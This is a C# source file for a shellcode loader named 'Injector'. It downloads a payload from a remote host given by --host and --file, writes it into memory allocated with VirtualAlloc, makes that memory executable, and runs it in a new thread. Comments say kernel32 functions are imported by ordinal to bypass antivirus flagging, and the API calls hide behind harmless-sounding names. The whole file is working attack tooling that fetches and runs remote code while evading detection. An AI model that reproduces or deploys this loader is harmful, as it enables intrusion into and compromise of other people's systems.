using System;
using System.Net;
using System.Runtime.InteropServices;

namespace Injector
{
    internal class MyRunner
    {
        //Command line options parsing
        class ParseArgs
        {
            public string host { get; private set; }
            public string file { get; private set; }

            public ParseArgs(string[] args)
            {
                for (int i = 0; i < args.Length; i++)
                {
                    string current = args[i];

                    if (current.StartsWith("--"))
                    {
                        if (current == "--host" && i + 1 < args.Length)
                        {
                            host = args[i + 1];
                        }
                        else if (current == "--file" && i + 1 < args.Length)
                        {
                            file = args[i + 1];
                        }
                    }
                }
            }
        }

        //use dll import with ordinals instead of function names to bypass AV flagging, this way we can define the needed function with an arbitrary name
        // LoadLibraryA -> 969
        // GetProcAddress -> 697
        [DllImport("kernel32", EntryPoint = "#969", SetLastError = true)]
        public static extern IntPtr LLA(string lname);

        [DllImport("kernel32", EntryPoint = "#697", SetLastError = true)]
        public static extern IntPtr GPA(IntPtr lhand, string addr);

        internal class RunIt 
        {
            // some constants
            private const uint PAGE_READWRITE = 0x40;
            private const uint PAGE_EXECUTEREAD = 0x20;
            private const uint MEM_COMMIT_RESERVE = 0x3000;
            private const uint OldProtection = 0;

            // delegations declaration
            //VirtualAlloc - LpAddress, dwSize, flAllocationType, flProtect
            public delegate IntPtr MVA(IntPtr addr, uint size, uint aloc, uint prot);
            //VirtualProtect - lpAddress, dwSize, flAllocationType, flProtect
            public delegate bool MVP(IntPtr addr, int size, uint aloc, uint prot);
            //CreateThread - sec_attrs, size, startHere, params, zero, id
            public delegate IntPtr MCT(IntPtr satt, uint size, IntPtr strt, IntPtr pms, uint zero, IntPtr ID);
            //WaitForSingleObject - value, value2
            public delegate uint WFSO(IntPtr val, uint val2);

            public RunIt(byte[] code_to_run) 
            {
                // Reference the functions trough the new arbitrary names as they are loaded trough ordinals
                IntPtr main_lib = LLA("kernel32.dll");
                IntPtr p1 = GPA(main_lib, "VirtualAlloc");
                IntPtr p2 = GPA(main_lib, "VirtualProtect");
                IntPtr p3 = GPA(main_lib, "CreateThread");
                IntPtr p4 = GPA(main_lib, "WaitForSingleObject");

                //define out new methods
                MVA SweetSpaceForCode = Marshal.GetDelegateForFunctionPointer<MVA>(p1);
                MVP Avenger = Marshal.GetDelegateForFunctionPointer<MVP>(p2);
                MCT CreateProgImage = Marshal.GetDelegateForFunctionPointer<MCT>(p3);
                WFSO WaitForIt = Marshal.GetDelegateForFunctionPointer<WFSO>(p4);

                //Debug
                Console.WriteLine($"Payload length: {code_to_run.Length}");
                //
                Console.WriteLine("Attempting to run shellcode");

                //Set some memory for the shellcode
                IntPtr sweet_space = SweetSpaceForCode(IntPtr.Zero, (uint)code_to_run.Length, MEM_COMMIT_RESERVE, PAGE_READWRITE);

                //Debug
                if (code_to_run == null)
                {
                    Console.WriteLine("The 'code_to_run' byte array is null.");
                    return;
                }

                if (sweet_space == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to allocate memory using VirtualAlloc.");
                    Console.WriteLine(Marshal.GetLastWin32Error());
                    return;
                }
                //

                //Copy the shell code to the allocated memory
                Marshal.Copy(code_to_run, 0, sweet_space, code_to_run.Length);
                //Set memory protections
                Avenger(sweet_space, (int)code_to_run.Length, PAGE_EXECUTEREAD, OldProtection);
                //Create a thread
                IntPtr ImageRunner = CreateProgImage(IntPtr.Zero, 0, sweet_space, IntPtr.Zero, 0, IntPtr.Zero);

                //Debug
                if (ImageRunner == IntPtr.Zero)
                {
                    Console.WriteLine("Failed to create a thread.");
                    return;
                }
                //

                WaitForIt(ImageRunner, 0xFFFFFFFF);
            }
        }

        internal class GetCodeToRun
        {
            public byte[] bytes_to_run { get; private set; }
            public string host { get; private set; }
            public string file { get; private set; }
            private WebClient client = new WebClient();

            public GetCodeToRun(string remote_host, string remote_file)
            {
                host = remote_host;
                file = remote_file;
            }

            public void Run()
            {
                try
                {
                    Console.WriteLine($"Connecting to remote host: {host}");
                    client.BaseAddress = host;
                    Console.WriteLine($"Fetching shellcode from file: {file}");
                    bytes_to_run = client.DownloadData(file);
                }
                catch (WebException ex) {
                    Console.WriteLine("An error occurred while making the HTTP request:");
                    Console.WriteLine(ex.Message);
                    Environment.Exit(1);
                }
                catch (ArgumentException ex)
                {
                    Console.WriteLine("Provide the host with a valid scheme: http/https");
                    Environment.Exit(1);
                }
            }
        }


        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                Console.WriteLine("Please provide arguments --host and --file");
                Environment.Exit(0);
            }
            var arguments = new ParseArgs(args);
            var fetch = new GetCodeToRun(arguments.host, arguments.file);
            fetch.Run();
            new RunIt(fetch.bytes_to_run);
        }
    }
}